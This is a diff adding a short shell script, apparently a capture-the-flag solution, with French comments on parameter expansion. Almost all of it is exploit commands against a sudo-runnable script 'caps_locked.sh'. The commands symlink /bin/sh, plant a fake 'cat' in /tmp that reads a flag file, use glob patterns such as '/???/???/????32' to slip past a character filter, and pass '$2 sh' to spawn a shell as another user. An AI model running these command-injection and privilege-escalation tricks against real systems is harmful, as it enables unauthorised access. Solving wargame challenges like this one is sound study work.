@@ -1,0 +1,12 @@
+#parameter expansion
+#n°3 /tmp non exploitable
+
+#n°1
+ln -s /bin/sh ./SH
+echo "cat /../flag" > /tmp/cat
+sudo -u bobcat-gg ~/caps_locked.sh "./cat ~/../*/*"
+
+
+#n°1-2-3
+sudo -u bobcat-gg ./caps_locked.sh "/???/???/????32 ????"
+sudo -u bobcat-gg ./caps_locked.sh \$2 sh
